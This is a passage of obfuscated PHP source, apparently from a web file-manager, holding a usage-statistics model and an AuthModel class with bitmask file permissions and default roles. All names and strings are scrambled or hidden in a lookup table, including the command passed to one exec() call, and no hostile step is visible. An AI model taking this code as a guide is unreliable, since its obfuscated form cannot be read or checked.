$ÉºÍ”¸å[1833]))); if (!isset($ÁÖŒµÑ[$®èĞİı])) { return !1; } $this->optionType = $ÁÖŒµÑ[$®èĞİı][$ÉºÍ”¸å[33]]; $this->field = $ÁÖŒµÑ[$®èĞİı][$ÉºÍ”¸å[326]]; return !0; } public function listData($¸ñÉÏ = false, $–£ÆºÈÃ = "\x6d\x6f\144\151\x66\171\124\151\155\145", $¢€ğïµĞ = false) { return parent::listData($¸ñÉÏ, $–£ÆºÈÃ, $¢€ğïµĞ); } public function trendList($Ó—Âî·±) { $û‡Ïåçï =& $_SERVER[Ö†ØøÖ±]; $ŸŸº¬™Ä = $this->listData(); if ($ŸŸº¬™Ä) { $˜ñû“ = end($ŸŸº¬™Ä); $Ò¥ä±â = date($û‡Ïåçï[1834], strtotime($û‡Ïåçï[1835])); if ($˜ñû“[$û‡Ïåçï[239]] == $Ò¥ä±â) { return $ŸŸº¬™Ä; } $õ¸¯Ç‰Æ = strtotime($˜ñû“[$û‡Ïåçï[239]]); } if (!isset($õ¸¯Ç‰Æ)) { $æ®©ñø† = $Ó—Âî·± == $û‡Ïåçï[639] ? $û‡Ïåçï[576] : $û‡Ïåçï[878]; $õ¸¯Ç‰Æ = Model($æ®©ñø†)->min($û‡Ïåçï[215]); } $Å“íİ‡ = $û‡Ïåçï[1836] . ucfirst($Ó—Âî·±); $éğÜÈ¤¹ = $this->dateList($õ¸¯Ç‰Æ); foreach ($éğÜÈ¤¹ as $Ò¥ä±â) { $this->{$Å“íİ‡}($Ò¥ä±â); } return $this->listData(); } private function dateList($†Ü×±İ) { $ö¯÷ƒ´Ç =& $_SERVER[Ö†ØøÖ±]; $¹–‰ç½µ = $†Ü×±İ; $¨ÈÒì£Æ = strtotime($ö¯÷ƒ´Ç[1835]); $¼éè·‚¯ = array(); while ($¹–‰ç½µ <= $¨ÈÒì£Æ) { $¼éè·‚¯[] = date($ö¯÷ƒ´Ç[1834], $¹–‰ç½µ); $¹–‰ç½µ = strtotime($ö¯÷ƒ´Ç[1837], $¹–‰ç½µ); } return $¼éè·‚¯; } public function _recordUser($§•ËŒ = '') { $ÙâÃÙÈ =& $_SERVER[Ö†ØøÖ±]; $Ë£”¿÷Ï = strtotime(date($ÙâÃÙÈ[1838], strtotime($§•ËŒ))); $³‹í¤¹İ = strtotime(date($ÙâÃÙÈ[1839], strtotime($§•ËŒ))); $æâşÈêÜ = array($ÙâÃÙÈ[215] => array($ÙâÃÙÈ[1066], $³‹í¤¹İ)); $ìì“À‡ = Model($ÙâÃÙÈ[576])->where($æâşÈêÜ)->count($ÙâÃÙÈ[1699]); $æâşÈêÜ[$ÙâÃÙÈ[215]] = array($ÙâÃÙÈ[386], array($Ë£”¿÷Ï, $³‹í¤¹İ)); $„éÄáûÕ = Model($ÙâÃÙÈ[576])->where($æâşÈêÜ)->count($ÙâÃÙÈ[1699]); $æâşÈêÜ[$ÙâÃÙÈ[33]] = $ÙâÃÙÈ[1840]; $Ëø³ÃÎ“ = Model($ÙâÃÙÈ[1841])->where($æâşÈêÜ)->count($ÙâÃÙÈ[1842]); $’÷Ô´Ûà = array($ÙâÃÙÈ[239] => $§•ËŒ, $ÙâÃÙÈ[818] => (int) $ìì“À‡, $ÙâÃÙÈ[1827] => (int) $„éÄáûÕ, $ÙâÃÙÈ[1828] => (int) $Ëø³ÃÎ“); return $this->insert($’÷Ô´Ûà); } public function _recordStore($ìì¥àÚ­ = '') { $åí÷¤¼µ =& $_SERVER[Ö†ØøÖ±]; $ŸˆÁ×êÉ = strtotime(date($åí÷¤¼µ[1839], strtotime($ìì¥àÚ­))); $ÔÊüÑœ» = array($åí÷¤¼µ[215] => array($åí÷¤¼µ[1066], $ŸˆÁ×êÉ)); $¼íº™¤ = Model($åí÷¤¼µ[521])->where($ÔÊüÑœ»)->sum($åí÷¤¼µ[76]); $ÔÊüÑœ»[$åí÷¤¼µ[462]] = 0; $õ¿˜Ú‚ = Model($åí÷¤¼µ[878])->where($ÔÊüÑœ»)->sum($åí÷¤¼µ[76]); $ÔÊüÑœ»[$åí÷¤¼µ[178]] = 1; $Şì®›í› = Model($åí÷¤¼µ[878])->where($ÔÊüÑœ»)->sum($åí÷¤¼µ[76]); $ÔÊüÑœ»[$åí÷¤¼µ[178]] = 2; $ÌàşÚÊò = Model($åí÷¤¼µ[878])->where($ÔÊüÑœ»)->sum($åí÷¤¼µ[76]); $ÉæùÈ¼ = array($åí÷¤¼µ[239] => $ìì¥àÚ­, $åí÷¤¼µ[816] => (int) $õ¿˜Ú‚, $åí÷¤¼µ[1831] => (int) $¼íº™¤, $åí÷¤¼µ[1832] => (int) $Şì®›í›, $åí÷¤¼µ[1833] => (int) $ÌàşÚÊò); return $this->insert($ÉæùÈ¼); } public function trend($•Ù‘Ô¥, $ËØÂú¨) { $€ˆÚß…À =& $_SERVER[Ö†ØøÖ±]; if (!$this->init($•Ù‘Ô¥)) { return !1; } $ËÙ¥„›š = $this->trendList($•Ù‘Ô¥); if ($ËÙ¥„›š && $ËØÂú¨ != $€ˆÚß…À[1672]) { $î´É×üÌ = $ËÙ¥„›š[0][$€ˆÚß…À[239]]; $¤Ô›¿Ê” = $this->validDate($ËØÂú¨, $î´É×üÌ); $ñ³ÖÃô = array(); $ü³ÊÕ” = array_to_keyvalue($ËÙ¥„›š, $€ˆÚß…À[239]); foreach ($¤Ô›¿Ê” as $«¬ÅËÚ„) { if (isset($ü³ÊÕ”[$«¬ÅËÚ„])) { $Á„Í¢³  = $ü³ÊÕ”[$«¬ÅËÚ„]; } else { $Á„Í¢³  = end($ËÙ¥„›š); $Á„Í¢³ [$€ˆÚß…À[239]] = $«¬ÅËÚ„; if ($•Ù‘Ô¥ == $€ˆÚß…À[639]) { $Á„Í¢³ [$€ˆÚß…À[1827]] = $Á„Í¢³ [$€ˆÚß…À[1828]] = 0; } } $ñ³ÖÃô[] = $Á„Í¢³ ; } $ËÙ¥„›š = $ñ³ÖÃô; } $ÎîÎœÑî = array($€ˆÚß…À[639] => array($€ˆÚß…À[818] => LNG($€ˆÚß…À[1843]), $€ˆÚß…À[1827] => LNG($€ˆÚß…À[1844]), $€ˆÚß…À[1828] => LNG($€ˆÚß…À[1845])), $€ˆÚß…À[1829] => array($€ˆÚß…À[816] => LNG($€ˆÚß…À[1846]), $€ˆÚß…À[1831] => LNG($€ˆÚß…À[1847]), $€ˆÚß…À[1832] => LNG($€ˆÚß…À[1848]), $€ˆÚß…À[1833] => LNG($€ˆÚß…À[1849]))); $´‰ºà² = array($€ˆÚß…À[639] => $€ˆÚß…À[1850], $€ˆÚß…À[1829] => $€ˆÚß…À[76]); if (empty($ËÙ¥„›š)) { $«¬ÅËÚ„ = date($€ˆÚß…À[1834], strtotime($€ˆÚß…À[1835])); $ÛøäÜ¼ƒ = array($€ˆÚß…À[239] => $«¬ÅËÚ„); foreach ($ÎîÎœÑî[$•Ù‘Ô¥] as $€¨¬ƒ›á => $¥×îˆĞê) { $ÛøäÜ¼ƒ[$€¨¬ƒ›á] = 0; } $ËÙ¥„›š[] = $ÛøäÜ¼ƒ; } $ö¹ïÜèâ = array(); foreach ($ËÙ¥„›š as $¥×îˆĞê) { if ($•Ù‘Ô¥ == $€ˆÚß…À[1829] && $¥×îˆĞê[$€ˆÚß…À[1831]] > $¥×îˆĞê[$€ˆÚß…À[816]]) { $¥×îˆĞê[$€ˆÚß…À[1831]] = $¥×îˆĞê[$€ˆÚß…À[816]]; } foreach ($ÎîÎœÑî[$•Ù‘Ô¥] as $€¨¬ƒ›á => $ ’ğ·÷Ç) { $Á„Í¢³  = array($€ˆÚß…À[239] => $¥×îˆĞê[$€ˆÚß…À[239]], $€ˆÚß…À[1596] => $ ’ğ·÷Ç); $Á„Í¢³ [$´‰ºà²[$•Ù‘Ô¥]] = isset($¥×îˆĞê[$€¨¬ƒ›á]) ? $¥×îˆĞê[$€¨¬ƒ›á] : 0; $ö¹ïÜèâ[] = $Á„Í¢³ ; } } return $ö¹ïÜèâ; } public function validDate($Š™ÎéñŸ, $‹ïóˆ™) { $Ø“é¼¬” =& $_SERVER[Ö†ØøÖ±]; $Ï£şÃ–Ş = date($Ø“é¼¬”[1834], strtotime($Ø“é¼¬”[1835])); $”ğŠàÎ¶ = array($Ï£şÃ–Ş); switch ($Š™ÎéñŸ) { case $Ø“é¼¬”[1679]: $ºôÇÃ¼‹ = mktime(0, 0, 0, date($Ø“é¼¬”[1851]), date($Ø“é¼¬”[1413]) - date($Ø“é¼¬”[1476]) + 7 - 7, date($Ø“é¼¬”[1852])); $­ÅŸÃ‹î = 0; do { $ŠÄ¦¼³¥ = date($Ø“é¼¬”[1834], $ºôÇÃ¼‹ - 3600 * 24 * 7 * $­ÅŸÃ‹î); $”ğŠàÎ¶[] = $ŠÄ¦¼³¥; $­ÅŸÃ‹î++; } while ($‹ïóˆ™ < $ŠÄ¦¼³¥); break; case $Ø“é¼¬”[1677]: $­ÅŸÃ‹î = 1; do { $ß¿å½¦ = date($Ø“é¼¬”[1853], strtotime("\x2d\40{$­ÅŸÃ‹î}\x20\x6d\157\156\164\x68\163")); $”ğŠàÎ¶[] = $ß¿å½¦; $­ÅŸÃ‹î++; } while ($‹ïóˆ™ < $ß¿å½¦); break; case $Ø“é¼¬”[1854]: $ƒ¦à×Ÿ‹ = (int) date($Ø“é¼¬”[1852], strtotime($‹ïóˆ™)); $Ö»ë¦Ç˜ = (int) date($Ø“é¼¬”[1852]); if ($ƒ¦à×Ÿ‹ >= $Ö»ë¦Ç˜) { break; } for ($ƒ¦à×Ÿ‹; $ƒ¦à×Ÿ‹ < $Ö»ë¦Ç˜; $ƒ¦à×Ÿ‹++) { $”ğŠàÎ¶[] = $ƒ¦à×Ÿ‹ . $Ø“é¼¬”[1855]; } break; default: break; } if ($‹ïóˆ™ > end($”ğŠàÎ¶)) { array_pop($”ğŠàÎ¶); } sort($”ğŠàÎ¶); return $”ğŠàÎ¶; } public function listTable($Ú¢Í­ê´) { $şœóã± = ucfirst($Ú¢Í­ê´); return Model($şœóã±)->listData(); } public function option($‹ËÅæà) { $Ï™ó“© = $_SERVER[Ö†ØøÖ±][1856] . ucfirst($‹ËÅæà); return $this->{$Ï™ó“©}(); } private function optionUser() { $Ğ©ìÓãñ =& $_SERVER[Ö†ØøÖ±]; $¶Û×‰›¸ = Model($Ğ©ìÓãñ[576])->count($Ğ©ìÓãñ[1699]); $Şûø¸¢ª = Model($Ğ©ìÓãñ[576])->where($Ğ©ìÓãñ[1857])->count($Ğ©ìÓãñ[1699]); $¡˜æšâî = intval($GLOBALS[$Ğ©ìÓãñ[6]][$Ğ©ìÓãñ[402]][$Ğ©ìÓãñ[1651]]) / 3600; $Ü™ïõ¨Ú = strtotime("\55{$¡˜æšâî}\40\x68\157\165\162\163"); $‚‹©ÅÚö = strtotime(date($Ğ©ìÓãñ[1838])); if ($Ü™ïõ¨Ú < $‚‹©ÅÚö) { $Ü™ïõ¨Ú = $‚‹©ÅÚö; } $ÇÁı†°á = array($Ğ©ìÓãñ[1858] => array($Ğ©ìÓãñ[1067], $Ü™ïõ¨Ú)); $‘Ïû÷Şü = (int) Model($Ğ©ìÓãñ[576])->where($ÇÁı†°á)->count($Ğ©ìÓãñ[1699]); if (!$‘Ïû÷Şü) { $‘Ïû÷Şü = 1; } $ÇÁı†°á = array($Ğ©ìÓãñ[1858] => array($Ğ©ìÓãñ[1067], $‚‹©ÅÚö)); $–â·ä‚ = Model($Ğ©ìÓãñ[576])->where($ÇÁı†°á)->count($Ğ©ìÓãñ[1699]); return array($Ğ©ìÓãñ[811] => (int) $¶Û×‰›¸, $Ğ©ìÓãñ[1859] => (int) ($¶Û×‰›¸ - $Şûø¸¢ª), $Ğ©ìÓãñ[1860] => (int) $Şûø¸¢ª, $Ğ©ìÓãñ[1861] => (int) $–â·ä‚, $Ğ©ìÓãñ[1862] => $‘Ïû÷Şü); } private function optionFile() { $ğÙŠôÂ =& $_SERVER[Ö†ØøÖ±]; $Æş†¸ëĞ = $this->sourceSize(); $ŒãµôÑæ = $Æş†¸ëĞ[$ğÙŠôÂ[76]]; $Ê¤îÄñŞ = $Æş†¸ëĞ[$ğÙŠôÂ[1831]]; $¤ï“ÊÁ = Model($ğÙŠôÂ[878])->where(array($ğÙŠôÂ[462] => 0))->count($ğÙŠôÂ[181]); $«·×¦±İ = array($ğÙŠôÂ[462] => 0, $ğÙŠôÂ[215] => array($ğÙŠôÂ[1067], strtotime(date($ğÙŠôÂ[1838])))); $Àû‰ÎêÃ = Model($ğÙŠôÂ[878])->where($«·×¦±İ)->sum($ğÙŠôÂ[76]); $¹©­‰¤ç = Model($ğÙŠôÂ[878])->where($«·×¦±İ)->count($ğÙŠôÂ[181]); return array($ğÙŠôÂ[816] => $ŒãµôÑæ, $ğÙŠôÂ[1831] => $Ê¤îÄñŞ, $ğÙŠôÂ[1863] => $ŒãµôÑæ - $Ê¤îÄñŞ, $ğÙŠôÂ[1864] => (int) $Àû‰ÎêÃ, $ğÙŠôÂ[818] => (int) $¤ï“ÊÁ, $ğÙŠôÂ[1865] => (int) $¹©­‰¤ç); } private function optionAccess() { $Ê¬å±¨¢ =& $_SERVER[Ö†ØøÖ±]; return array($Ê¬å±¨¢[811] => $this->typeLogCnt(), $Ê¬å±¨¢[107] => $this->typeLogCnt($Ê¬å±¨¢[107]), $Ê¬å±¨¢[502] => $this->typeLogCnt($Ê¬å±¨¢[502]), $Ê¬å±¨¢[1866] => $this->typeLogCnt($Ê¬å±¨¢[1866]), $Ê¬å±¨¢[1867] => $this->typeLogCnt($Ê¬å±¨¢[1867]), $Ê¬å±¨¢[639] => $this->typeLogCnt($Ê¬å±¨¢[12], $Ê¬å±¨¢[1842])); } private function typeLogCnt($äôÃÂî¢ = '', $¦„¬¾ÂÀ = "\151\144") { $«ø¢–ù’ =& $_SERVER[Ö†ØøÖ±]; $œ®×Úäå = array($«ø¢–ù’[107] => array($«ø¢–ù’[1868], $«ø¢–ù’[1869]), $«ø¢–ù’[502] => array($«ø¢–ù’[1870], $«ø¢–ù’[1871]), $«ø¢–ù’[1866] => array($«ø¢–ù’[1872], $«ø¢–ù’[1873], $«ø¢–ù’[1874]), $«ø¢–ù’[1867] => array($«ø¢–ù’[1875], $«ø¢–ù’[1876]), $«ø¢–ù’[1877] => array($«ø¢–ù’[1878], $«ø¢–ù’[1879], $«ø¢–ù’[1880])); $ş€óşÊâ = strtotime(date($«ø¢–ù’[1838])); $ğì¸ğÅ = array($«ø¢–ù’[215] => array($«ø¢–ù’[1067], $ş€óşÊâ)); if ($äôÃÂî¢) { $ğì¸ğÅ[$«ø¢–ù’[33]] = array($«ø¢–ù’[7], $œ®×Úäå[$äôÃÂî¢]); } $†¤…àÁñ = Model($«ø¢–ù’[1841])->where($ğì¸ğÅ)->count($¦„¬¾ÂÀ); return (int) $†¤…àÁñ; } private function optionServer() { $ùŒ¨åÀõ =& $_SERVER[Ö†ØøÖ±]; $Şù°Áä = $this->diskDriver(); $Ğ§¯ = KodIO::defaultDriver(); $¤Ÿ­Îª¦ = array($ùŒ¨åÀõ[870] => $Ğ§¯[$ùŒ¨åÀõ[451]]); $Ùû¬§¯á = Model($ùŒ¨åÀõ[521])->where($¤Ÿ­Îª¦)->sum($ùŒ¨åÀõ[76]); $‰”œñ²Â = explode($ùŒ¨åÀõ[53], $_SERVER[$ùŒ¨åÀõ[144]]); $½º±îæ = $‰”œñ²Â[0]; $ñ ½çà² = $GLOBALS[$ùŒ¨åÀõ[6]][$ùŒ¨åÀõ[21]]; $µÈî˜½ä = $ñ ½çà²[$ùŒ¨åÀõ[1029]]; if ($µÈî˜½ä == $ùŒ¨åÀõ[1017]) { $‡»Ó°™˜ = explode($ùŒ¨åÀõ[1335], $ñ ½çà²[$ùŒ¨åÀõ[1028]]); $µÈî˜½ä = $‡»Ó°™˜[0]; } if ($µÈî˜½ä == $ùŒ¨åÀõ[965] || $µÈî˜½ä == $ùŒ¨åÀõ[857]) { $²Ÿ¼ çÔ = Model()->db()->query($ùŒ¨åÀõ[1881]); $Õ½îœ×§ = $²Ÿ¼ çÔ[0] && isset($²Ÿ¼ çÔ[0][$ùŒ¨åÀõ[1595]]) ? $²Ÿ¼ çÔ[0][$ùŒ¨åÀõ[1595]] : 0; $µÈî˜½ä = $ùŒ¨åÀõ[1882] . ($Õ½îœ×§ ? $ùŒ¨åÀõ[8] . $Õ½îœ×§ : $ùŒ¨åÀõ[12]); } $™ä†ç€ = $GLOBALS[$ùŒ¨åÀõ[6]][$ùŒ¨åÀõ[402]][$ùŒ¨åÀõ[880]]; return array($ùŒ¨åÀõ[1883] => $Şù°Áä ? $Şù°Áä[$ùŒ¨åÀõ[1884]] : 0, $ùŒ¨åÀõ[1885] => $Şù°Áä ? $Şù°Áä[$ùŒ¨åÀõ[1886]] : 0, $ùŒ¨åÀõ[1887] => (int) $Ğ§¯[$ùŒ¨åÀõ[1884]] * 1024 * 1024 * 1024, $ùŒ¨åÀõ[1888] => (int) $Ùû¬§¯á, $ùŒ¨åÀõ[1889] => ucfirst($½º±îæ), $ùŒ¨åÀõ[1890] => $ùŒ¨åÀõ[1891] . PHP_VERSION, $ùŒ¨åÀõ[1892] => phpBuild64() ? 64 : 32, $ùŒ¨åÀõ[810] => str_replace($ùŒ¨åÀõ[1183], $ùŒ¨åÀõ[1045], $µÈî˜½ä), $ùŒ¨åÀõ[402] => ucfirst($™ä†ç€), $ùŒ¨åÀõ[32] => $_SERVER[$ùŒ¨åÀõ[1893]]); } private function diskDriver() { $¸Æ°íÍ‹ =& $_SERVER[Ö†ØøÖ±]; $××º€é = $¸Æ°íÍ‹[8]; $µï¡Ó† = $GLOBALS[$¸Æ°íÍ‹[6]][$¸Æ°íÍ‹[1352]] == $¸Æ°íÍ‹[1353]; if ($µï¡Ó†) { $××º€é = $¸Æ°íÍ‹[1894]; if (function_exists($¸Æ°íÍ‹[1895])) { exec($¸Æ°íÍ‹[1896], $¢“èÜÏ); $××º€é = $¢“èÜÏ[1] . $¸Æ°íÍ‹[8]; } } if (!file_exists($××º€é)) { return; } $‘Î†€à = @disk_total_space($××º€é); $½™Ö«¢˜ = $‘Î†€à - @disk_free_space($××º€é); return array($¸Æ°íÍ‹[1884] => $‘Î†€à, $¸Æ°íÍ‹[1886] => $½™Ö«¢˜); } public function fileChart($ôœ‰×µï) { $İ´Ûè =& $_SERVER[Ö†ØøÖ±]; if (isset($ôœ‰×µï[$İ´Ûè[1699]])) { return Model($İ´Ûè[878])->userFileTypeProfile($ôœ‰×µï[$İ´Ûè[1699]]); } if (isset($ôœ‰×µï[$İ´Ûè[1897]])) { return Model($İ´Ûè[878])->groupFileTypeProfile($ôœ‰×µï[$İ´Ûè[1897]]); } $ï¥¦Ùúë = $this->sourceSize(); $ÎËğ£ìµ = array($İ´Ûè[180] => 0, $İ´Ûè[178] => 1); $ÛÍğÎÀÏ = Model($İ´Ûè[878])->where($ÎËğ£ìµ)->sum($İ´Ûè[76]); $ÎËğ£ìµ[$İ´Ûè[178]] = 2; $Ü¥¡Èı¯ = Model($İ´Ûè[878])->where($ÎËğ£ìµ)->sum($İ´Ûè[76]); return array($İ´Ûè[816] => $ï¥¦Ùúë[$İ´Ûè[76]], $İ´Ûè[1831] => $ï¥¦Ùúë[$İ´Ûè[1831]], $İ´Ûè[1832] => (int) $ÛÍğÎÀÏ, $İ´Ûè[1833] => (int) $Ü¥¡Èı¯); } private function sourceSize() { $ŠœšîÅ› =& $_SERVER[Ö†ØøÖ±]; $¥ÌÔú¨İ = Model($ŠœšîÅ›[878])->where(array($ŠœšîÅ›[462] => 0))->sum($ŠœšîÅ›[76]); $ó€½í§Œ = Model($ŠœšîÅ›[521])->sum($ŠœšîÅ›[76]); if ($ó€½í§Œ > $¥ÌÔú¨İ) { $ó€½í§Œ = $¥ÌÔú¨İ; } return array($ŠœšîÅ›[76] => (int) $¥ÌÔú¨İ, $ŠœšîÅ›[1831] => (int) $ó€½í§Œ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $üÑƒÔ²ˆ =& $_SERVER[Ö†ØøÖ±]; $‘Ò×ÕÆ = array(array($üÑƒÔ²ˆ[471] => LNG($üÑƒÔ²ˆ[1898]), $üÑƒÔ²ˆ[1899] => $üÑƒÔ²ˆ[1900], $üÑƒÔ²ˆ[1901] => 1, $üÑƒÔ²ˆ[1902] => 1, $üÑƒÔ²ˆ[1903] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($üÑƒÔ²ˆ[471] => LNG($üÑƒÔ²ˆ[1904]), $üÑƒÔ²ˆ[1899] => $üÑƒÔ²ˆ[1905], $üÑƒÔ²ˆ[1901] => 2, $üÑƒÔ²ˆ[1902] => 1, $üÑƒÔ²ˆ[1903] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($üÑƒÔ²ˆ[471] => LNG($üÑƒÔ²ˆ[1906]), $üÑƒÔ²ˆ[1899] => $üÑƒÔ²ˆ[1907], $üÑƒÔ²ˆ[1901] => 3, $üÑƒÔ²ˆ[1902] => 1, $üÑƒÔ²ˆ[1903] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($üÑƒÔ²ˆ[471] => LNG($üÑƒÔ²ˆ[1908]), $üÑƒÔ²ˆ[1899] => $üÑƒÔ²ˆ[1909], $üÑƒÔ²ˆ[1901] => 4, $üÑƒÔ²ˆ[1902] => 1, $üÑƒÔ²ˆ[1903] => self::AUTH_SHOW | self::AUTH_VIEW), array($üÑƒÔ²ˆ[471] => LNG($üÑƒÔ²ˆ[1910]), $üÑƒÔ²ˆ[1899] => $üÑƒÔ²ˆ[1911], $üÑƒÔ²ˆ[1901] => 5, $üÑƒÔ²ˆ[1902] => 1, $üÑƒÔ²ˆ[1903] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($üÑƒÔ²ˆ[471] => LNG($üÑƒÔ²ˆ[1912]), $üÑƒÔ²ˆ[1899] => $üÑƒÔ²ˆ[1913], $üÑƒÔ²ˆ[1901] => 6, $üÑƒÔ²ˆ[1902] => 1, $üÑƒÔ²ˆ[1903] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($üÑƒÔ²ˆ[471] => LNG($üÑƒÔ²ˆ[1914]), $üÑƒÔ²ˆ[1899] => $üÑƒÔ²ˆ[1915], $üÑƒÔ²ˆ[1901] => 7, $üÑƒÔ²ˆ[1902] => 1, $üÑƒÔ²ˆ[1903] => 0)); return $‘Ò×ÕÆ; } public static function authCheck($¤“æ¾â, $Êˆ¾Ø‹) { $€®£”™Ä =& $_SERVER[Ö†ØøÖ±]; $¤“æ¾â = intval($¤“æ¾â); if ($GLOBALS[$€®£”™Ä[545]] && $GLOBALS[$€®£”™Ä[6]][$€®£”™Ä[1916]]) { return !0; } if ($¤“æ¾â <= 0) { return !1; } if (($¤“æ¾â & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¤“æ¾â & $Êˆ¾Ø‹); } public static function authCheckShow($İû¯ƒ‰€) { return self::authCheck($İû¯ƒ‰€, self::AUTH_SHOW); } public static function authCheckView($”Ç…ì©ï) { return self::authCheck($”Ç…ì©ï, self::AUTH_VIEW); } public static function authCheckDownload($È•¨Ôšº) { return self::authCheck($È•¨Ôšº, self::AUTH_DOWNLOAD); } public static function authCheckUpload($×Åî¢œÁ) { return self::authCheck($×Åî¢œÁ, self::AUTH_UPLOAD); } public static function authCheckEdit($ˆ–»«ß…) { return self::authCheck($ˆ–»«ß…, self::AUTH_EDIT); } public static function authCheckRemove($¾ç¶Ú) { return self::authCheck($¾ç¶Ú, self::AUTH_REMOVE); } public static function authCheckShare($±¨­–•÷) { return self::authCheck($±¨­–•÷, self::AUTH_SHARE); } public static function authCheckComment($™…”ıÔú) { return self::authCheck($™…”ıÔú, self::AUTH_COMMENT); } public static function authCheckEvent($áÃ¾Æ’§) { return self::authCheck($áÃ¾Æ’§, self::AUTH_EVENT); } public static function authCheckRoot($©ôÅ©ü) { return self::authCheck($©ôÅ©ü, self::AUTH_ROOT); } public static function authCheckAction($šåí©Ö§, $ÇÒ¾…­) { $¢×Çï‰¾ =& $_SERVER[Ö†ØøÖ±]; $¤ÁÉ‘… = array($¢×Çï‰¾[1917] => self::AUTH_VIEW, $¢×Çï‰¾[1247] => self::AUTH_DOWNLOAD, $¢×Çï‰¾[107] => self::AUTH_UPLOAD, $¢×Çï‰¾[1867] => self::AUTH_EDIT, $¢×Çï‰¾[1866] => self::AUTH_REMOVE, $¢×Çï‰¾[1877] => self::AUTH_SHARE, $¢×Çï‰¾[407] => self::AUTH_COMMENT, $¢×Çï‰¾[1687] => self::AUTH_EVENT, $¢×Çï‰¾[1918] => self::AUTH_ROOT); if (!isset($¤ÁÉ‘…[$ÇÒ¾…­])) { return; } $Ú…ïçò… = $¤ÁÉ‘…[$ÇÒ¾…­]; $šåí©Ö§ = intval($šåí©Ö§); if ($šåí©Ö§ <= 0) { return !1; } if (($šåí©Ö§ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($šåí©Ö§ & $Ú…ïçò…); } public static function authDisable($äªÂÃÕ», $Á²ÆÖîº) { if (intval($äªÂÃÕ») <= 0) { return 0; } return intval($äªÂÃÕ») & ~$Á²ÆÖîº; } public $optionType = "\123\x79\x73\164\145\155\56\163\157\165\x72\143\145\x41\165\x74\x68\x4c\x69\163\x74"; public $field = array("\156\141\x6d\x65", "\141\165\164\150", "\154\x61\x62\145\154", "\x64\151\163\x70\154\x61\171", "\163\x79\x73\x74\x65\x6d", "\x73\157\162\x74"); public function initData() { $ûÂ¾®€— = $this->authDefault(); foreach ($ûÂ¾®€— as $©»Âî®×) { $this->add($©»Âî®×); } } public function findAuth($«ü©§ÎŠ, $”Ñ™§ªÊ) { $÷Ò†Ù— =& $_SERVER[Ö†ØøÖ±]; $éÕáÔÊ” = parent::listData(); foreach ($éÕáÔÊ” as $¢¾µö) { $Éï»¡ß = intval($¢¾µö[$÷Ò†Ù—[464]]); if ($Éï»¡ß <= 0 || $¢¾µö[$÷Ò†Ù—[1919]] == 0) { continue; } if (($Éï»¡ß & $«ü©§ÎŠ) != $«ü©§ÎŠ) { continue; } if (($Éï»¡ß & $”Ñ™§ªÊ) != 0) { continue; } return $¢¾µö[$÷Ò†Ù—[451]]; } return !1; } public function findAuthReadOnly() { $ì±˜£‰Í = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Şµ…ÑÍ” = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ì±˜£‰Í, $Şµ…ÑÍ”); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $µ‡Æš›± =& $_SERVER[Ö†ØøÖ±]; $ç£×Ãİ = parent::listData(); $Ç÷´«Œñ = !1; foreach ($ç£×Ãİ as $ªüÇâğ) { if ($ªüÇâğ[$µ‡Æš›±[464]] <= 0 || $ªüÇâğ[$µ‡Æš›±[1919]] == $µ‡Æš›±[212]) { continue; } if (!$Ç÷´«Œñ) { $Ç÷´«Œñ = $ªüÇâğ; continue; } if ($Ç÷´«Œñ[$µ‡Æš›±[464]] > $ªüÇâğ[$µ‡Æš›±[464]]) { $Ç÷´«Œñ = $ªüÇâğ; } } return $Ç÷´«Œñ ? $Ç÷´«Œñ[$µ‡Æš›±[451]] : $µ‡Æš›±[12]; } public function listData($‡ƒàÑé = false, $ŞÜèÂ‰ = "\x73\157\x72\x74", $¹º˜ùø = false) { return parent::listData($‡ƒàÑé, $ŞÜèÂ‰, $¹º˜ùø); } public function update($¬Ò´ÓÜò, $ºá€£ÂÖ) { $œÔşœ¦ï =& $_SERVER[Ö†ØøÖ±]; $¥ŠÓ»ªÅ = parent::listData($¬Ò´ÓÜò); $ì™¬†€š = $this->findByName($ºá€£ÂÖ[$œÔşœ¦ï[32]]); if (!$¥ŠÓ»ªÅ || $ì™¬†€š && $ì™¬†€š[$œÔşœ¦ï[451]] != $¥ŠÓ»ªÅ[$œÔşœ¦ï[451]]) { return !1; } $this->filterAuth($ºá€£ÂÖ[$œÔşœ¦ï[464]]); return parent::update($¬Ò´ÓÜò, $ºá€£ÂÖ); } public function remove($æş§ÕÇ€) { $ş»ïüàÎ = parent::listData($æş§ÕÇ€); if (!$ş»ïüàÎ || $ş»ïüàÎ[$_SERVER[Ö†ØøÖ±][179]]) { return !1; } return parent::remove($æş§ÕÇ€); } public function add($ıàêÅ½ = array()) { $µõéà =& $_SERVER[Ö†ØøÖ±]; if ($this->findByName($ıàêÅ½[$µõéà[32]])) { return !1; } 